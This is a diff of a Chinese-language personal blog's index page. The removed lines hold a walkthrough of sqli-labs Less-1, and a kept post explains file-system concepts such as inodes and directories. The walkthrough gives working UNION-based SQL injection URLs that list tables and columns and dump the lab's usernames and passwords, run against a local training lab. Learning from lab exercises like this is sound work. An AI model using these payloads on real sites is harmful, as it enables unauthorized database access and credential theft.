-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">CONCAT_WS</span>(<span class="built_in">CHAR</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>());</span><br><span class="line">+<span class="comment">-------------------------------------------------------+</span></span><br><span class="line">| CONCAT_WS(CHAR(32,58,32),user(),database(),version()) |</span><br><span class="line">+<span class="comment">-------------------------------------------------------+</span></span><br><span class="line">| root@localhost : information_schema : 10.1.32-MariaDB |</span><br><span class="line">+<span class="comment">-------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
-</li>
 </ul>
-<h1 id="LESS-1-基于字符串的注入"><a href="#LESS-1-基于字符串的注入" class="headerlink" title="LESS 1 基于字符串的注入"></a>LESS 1 基于字符串的注入</h1><p>提示以数字id作为参数输入<br>先让id=’看看会不会报错：</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-1/?id=%27" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=%27</a></p>
-</blockquote>
-<p>报错了，错误信息：</p>
-<blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’’ LIMIT 0,1’ at line 1</p>
-</blockquote>
-<p>可以看出参数为字符串，于是构造union语句查出列数为3：</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=0&#39;</a> union select 1,2,3%23</p>
-</blockquote>
-<p>令id=0是因为经查询发现表中没有id=0的段，所以查询结果就会变成union语句中的查询结果，’和注释符%23用来绕过查询语句中的单引号，结果：</p>
-<blockquote>
-<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:3</p>
-</blockquote>
-<p>于是构造查询语句：</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=0&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</p>
-</blockquote>
-<p>获得了当前数据库的表名：</p>
-<blockquote>
-<p>Welcome    Dhakkan<br>Your Login name:emails,referers,uagents,users<br>Your Password:3</p>
-</blockquote>
-<p>继续查询users表的列名：</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=0&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’%23</p>
-</blockquote>
-<p>结果：</p>
-<blockquote>
-<p>Welcome    Dhakkan<br>Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password<br>Your Password:3</p>
-</blockquote>
-<p>最后的payload:</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=0&#39;</a> union select 1,group_concat(username),group_concat(password) from users%23</p>
-</blockquote>
-<p>结果：</p>
-<blockquote>
-<p>Welcome    Dhakkan<br>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
-</blockquote>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/27/sqli-libs-less1/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -798,7 +942,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lilin">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -835,6 +979,39 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/操作系统/" itemprop="url" rel="index">
+                    <span itemprop="name">操作系统</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/操作系统/文件系统/" itemprop="url" rel="index">
+                    <span itemprop="name">文件系统</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -863,8 +1040,7 @@
 
       
         
-          
-            <h2 id="什么是文件？"><a href="#什么是文件？" class="headerlink" title="什么是文件？"></a>什么是文件？</h2><p>&emsp;&emsp;信息按一定结构方式组成文件，由文件名进行标识</p>
+          <h2 id="什么是文件？"><a href="#什么是文件？" class="headerlink" title="什么是文件？"></a>什么是文件？</h2><p>&emsp;&emsp;信息按一定结构方式组成文件，由文件名进行标识</p>
 <h2 id="什么是文件系统"><a href="#什么是文件系统" class="headerlink" title="什么是文件系统?"></a>什么是文件系统?</h2><p>&emsp;&emsp;文件与管理信息资源的管理程序的集合称为文件系统</p>
 <h2 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h2><ul>
 <li><h3 id="文件控制块-FCB"><a href="#文件控制块-FCB" class="headerlink" title="文件控制块(FCB)"></a>文件控制块(FCB)</h3><ul>
@@ -883,88 +1059,14 @@
 <li><p>inode结构示例：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> i_ino;    <span class="comment">//inode号</span></span><br><span class="line">    <span class="keyword">atomic_t</span> i_count;       <span class="comment">//inode引用数</span></span><br><span class="line">    <span class="keyword">kdev_t</span> i_dev;           <span class="comment">//inode所在设备</span></span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">minix_inode_info</span> <span class="title">minix_i</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ext2_inode_info</span> <span class="title">ext2_i</span>;</span></span><br><span class="line">        ……</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>因为在文件访问过程中会频繁使用inode，所以Linux在系统所占的内存区内开辟了一张内存索引节点表，又<strong>活动inode表</strong>，含有100个表项，每个表项称一个<strong>活动inode</strong>。访问文件时，若在活动inode表中找不到其inode，就申请一个空闲活动inode，把磁盘inode内容复制给它，类似存储管理中的虚拟存储</p>
-</li>
-</ul>
-</li>
-<li><h3 id="层次目录结构"><a href="#层次目录结构" class="headerlink" title="层次目录结构"></a>层次目录结构</h3><ul>
-<li>Linux系统中，文件目录结构是一颗倒置的树，树根是根目录，树枝是子目录，树叶是文件。在树状目录中，一个文件的全名包括从根目录起至文件为止，在通路上所遇到的所有子目录路径，子目录名之间用斜线隔开。Linux文件系统中，根目录下包含dev（设备子目录），usr（命令程序文件和库程序子目录），var（变化的文件子目录），etc（基本数据文和实用程序子目录），home（用户文件主目录）等</li>
-<li>纯树形目录结构有一个缺点：文件的共享不是对称的，其他被授权用户必须经过文件父目录才能访问该文件。而有向无环图目录结构可以解决这个问题，属于不同用户的多个目录可能使用不同的文件名访问和共享同一个文件。有向无环图需要为每个文件维护一个引用计数，以此记录文件的父目录个数，当引用计数值为1时，删除操作才能移去文件，否则仅删除相关记录</li>
-<li>Linux系统支持多父目录，但其中有一个是主父目录，文件被物理地存储在此目录下，其他父目录通过link方式来链接和引用文件</li>
-</ul>
-</li>
-<li><h3 id="文件目录检索"><a href="#文件目录检索" class="headerlink" title="文件目录检索"></a>文件目录检索</h3><ul>
-<li>前面有提到每个目录至少包含“.”和“..”两个目录项，其中目录项“.”中的inode标号即为当前目录的inode标号，同理，目录项“..”中的inode标号即为父目录的inode标号</li>
-<li><strong>对于根目录来说，“..”和“.”的inode标号相同</strong></li>
-<li>假设现在应用进程要打开“/home/fei1/myfile.c”:<br>&emsp;&emsp;首先，遇到根目录“/”（通常被存放在磁盘的固定盘块），将其作为当前工作索引节点并把第一个物理块读入内存缓冲区，接着对根目录进行搜索，直至找到“home”的inode标号；然后检索活动inode表，若找不到home的inode，为其分配一个活动inode，经核对访问权限，将home作为当前工作索引节点，搜索和“fei1”匹配的物理块……最后找到myfile.c的inode号，从磁盘装入内容。其中任何一布出错都会返回错误码</li>
-</ul>
-</li>
-</ul>
-<h2 id="文件组织与数据存储"><a href="#文件组织与数据存储" class="headerlink" title="文件组织与数据存储"></a>文件组织与数据存储</h2><ul>
-<li><h3 id="文件逻辑结构"><a href="#文件逻辑结构" class="headerlink" title="文件逻辑结构"></a>文件逻辑结构</h3>逻辑结构是指为方便用户使用而对物理结构的一种抽象<ul>
-<li><h4 id="流式文件和记录式文件"><a href="#流式文件和记录式文件" class="headerlink" title="流式文件和记录式文件"></a>流式文件和记录式文件</h4><ul>
-<li><h5 id="流式文件"><a href="#流式文件" class="headerlink" title="流式文件"></a>流式文件</h5><ul>
-<li>一种无结构的文件，文件内的数据只是一串顺序的信息的集合，又称<strong>字节流文件</strong></li>
-<li>流式文件中的每一个字节都有一个索引，第一个字节索引为1，第二个字节索引为2……打开文件的进程使用文件读写指针来访问文件中的特定字节</li>
-<li>为了简化系统，大多数操作系统如Linux系统只提供流式文件</li>
-</ul>
-</li>
-<li><h5 id="记录式文件"><a href="#记录式文件" class="headerlink" title="记录式文件"></a>记录式文件</h5><ul>
-<li>一种有结构的文件，包含若干条逻辑记录，逻辑记录式文件中按信息在逻辑上的独立含义所划分的信息单位，如数据库文件</li>
-<li>在记录式文件中，逻辑记录是文件内独立的<strong>最小单位</strong>，文件的记录位置取代字节位置</li>
-<li>记录式文件有两种常用的记录组织和使用方法：<ul>
-<li>记录式顺序文件</li>
-<li>记录式索引顺序文件</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><h4 id="成组和分解"><a href="#成组和分解" class="headerlink" title="成组和分解"></a>成组和分解</h4><ul>
-<li>一条逻辑记录被存放到存储介质时可能占用一个或多个物理块，或者一个物理块包含多条逻辑记录。若干逻辑记录合并成一组，写入一块叫做<strong>记录成组</strong>，这时每块中的逻辑记录的个数称为块因子</li>
-<li>成组操作先在系统输出缓冲区内进行，缓冲区满时文件管理才发出一次I/O请求</li>
-<li>反之，把逻辑记录从块中分离出来的操作叫做<strong>分解</strong></li>
-</ul>
-</li>
-<li><h4 id="记录格式"><a href="#记录格式" class="headerlink" title="记录格式"></a>记录格式</h4>  记录格式就是记录内数据的排列方式，有以下三种：<ul>
-<li><h5 id="定长记录"><a href="#定长记录" class="headerlink" title="定长记录"></a>定长记录</h5>  所有逻辑记录具有相同长度，成组时<strong>除了最后一块</strong>，每块的逻辑记录数是一个常数</li>
-<li><h5 id="变长记录"><a href="#变长记录" class="headerlink" title="变长记录"></a>变长记录</h5>  逻辑记录不相等，但每条逻辑记录的长度处理之前能预先确定。逻辑记录的第一字段指明字节个数，第二字段存放记录信息。<strong>变长记录可以节省存储空间</strong></li>
-<li><h5 id="跨块记录"><a href="#跨块记录" class="headerlink" title="跨块记录"></a>跨块记录</h5>  当变长记录大于物理块长时，会发生逻辑记录跨越物理块的情形，这种情况下，逻辑记录被分割成段写到块中，读出时再做分配。跨块记录适合文件<strong>在不同物理特性的设备类型之间传送</strong>时使用</li>
-</ul>
-</li>
-<li><h4 id="记录键"><a href="#记录键" class="headerlink" title="记录键"></a>记录键</h4>  为了方便组织和管理记录式文件，定义了一个能标识某条逻辑记录的数据项，称为<strong>记录键</strong>，也叫<strong>关键字</strong>，简称<strong>键</strong>。同一个文件中，能唯一地标识某条逻辑记录的键称为<strong>主键</strong>。类似于数据库表的主键</li>
-</ul>
-</li>
-<li><h3 id="文件物理结构"><a href="#文件物理结构" class="headerlink" title="文件物理结构"></a>文件物理结构</h3>文件的物理结构和组织是指逻辑文件在物理存储空间中的存放方法和组织关系，有两类方法可用来构造文件物理结构：计算法（设计映射算法）和指针法（设置专门指针），下面是几种常见的文件物理结构<ul>
-<li><h4 id="顺序文件"><a href="#顺序文件" class="headerlink" title="顺序文件"></a>顺序文件</h4><ul>
-<li>又称连续文件，其逻辑记录顺序和物理块顺序完全一致，记录按照出现的次序被顺序读写或修改</li>
-<li>FCB中保存的磁盘定位信息由第一个物理块地址和文件信息块的总块数组成</li>
-<li>磁带上的文件是典型的顺序文件</li>
-<li>优点：速度快</li>
-<li>缺点：插入，修改文件记录困难；处理变长记录困难；浪费空闲块</li>
-</ul>
-</li>
-<li><h4 id="连接文件"><a href="#连接文件" class="headerlink" title="连接文件"></a>连接文件</h4><ul>
-<li>使用<strong>连接字</strong>（又称<strong>指针</strong>）来标识文件中各条记录之间的关系（类似于数据结构中的链表）</li>
-<li>存取信息必须通过缓冲区，待获得连接字后，才能找到下一个物理块的位置，因而仅适宜于顺序存储</li>
-<li>连接结构克服了顺序结构不适宜增删改的缺点，但在其他方面又会失去一些性能</li>
-</ul>
-</li>
-<li><h4 id="索引文件"><a href="#索引文件" class="headerlink" title="索引文件"></a>索引文件</h4><ul>
-<li>系统为每个文件建立索引表，利用索引表来搜索记录的文件称为索引文件 </li>
-<li>索引结构是连接结构的一种扩展，记录可以散列存储，具有直接读写任意记录的能录</li>
-</ul>
-</li>
-<li><h4 id="直接文件"><a href="#直接文件" class="headerlink" title="直接文件"></a>直接文件</h4><ul>
-<li>为了改善连接文件查找需遍历整个链接结构的缺点，利用哈希法将记录的关键字与其地址之间建立某种对应关系，以便实现快速存取。又称散列文件或哈希文件</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-          
+<li><p>因为在文件访问过程中会频繁使用inode，所以Linux在系统所占的内存区内开辟了一张内存索引节点表，又<strong>活动inode表</strong>，含有100个表项，每个表项称一个<strong>活动inode</strong>。访问文件时，若在活动inode表中找不到其inode，就申请一个空闲活动inode，把磁盘inode内容复制给它，类似存储管理中的虚拟存储</p></li></ul></li></ul>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/27/文件系统/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1016,7 +1118,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lilin">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1161,6 +1263,10 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
+              <img class="site-author-image" itemprop="image"
+                src="/avatar.jpg"
+                alt="Lilin" />
+            
               <p class="site-author-name" itemprop="name">Lilin</p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
@@ -1172,12 +1278,21 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
             
 
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
             
 
             
